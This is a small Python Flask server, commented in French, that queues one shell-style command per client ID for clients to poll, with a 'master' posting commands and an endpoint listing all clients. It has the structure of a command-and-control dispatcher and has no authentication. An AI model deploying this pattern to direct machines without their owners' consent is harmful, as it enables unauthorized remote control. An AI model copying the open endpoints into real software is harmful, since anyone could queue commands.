from flask import Flask, request, jsonify

app = Flask(__name__)

# Stockage des commandes par client
# commands = { clientid: {"cmd": "commande", "nonce": 123} }
commands = {}

@app.route('/getcommand/<clientid>', methods=['GET'])
def get_command(clientid):
    """
    Retourne la commande et le nonce pour le client.
    Si aucune commande n'existe, renvoie {"cmd": "", "nonce": -1}
    """
    cmd_data = commands.get(clientid, {"cmd": "", "nonce": -1})
    return jsonify(cmd_data), 200

@app.route('/getcommand/<clientid>', methods=['POST'])
def post_command(clientid):
    """
    Permet au master d'envoyer une commande et un nonce pour un client
    Expects JSON: {"cmd": "ping 127.0.0.1", "nonce": 42}
    """
    data = request.get_json()
    if not data:
        return jsonify({"message": "JSON manquant"}), 400

    cmd = data.get("cmd", "")
    nonce = data.get("nonce", 0)

    commands[clientid] = {
        "cmd": cmd,
        "nonce": nonce
    }

    return jsonify({"message": "Commande enregistrée"}), 200

@app.route('/listclients', methods=['GET'])
def list_clients():
    """Retourne la liste des clients ayant une commande stockée"""
    return jsonify(list(commands.keys())), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
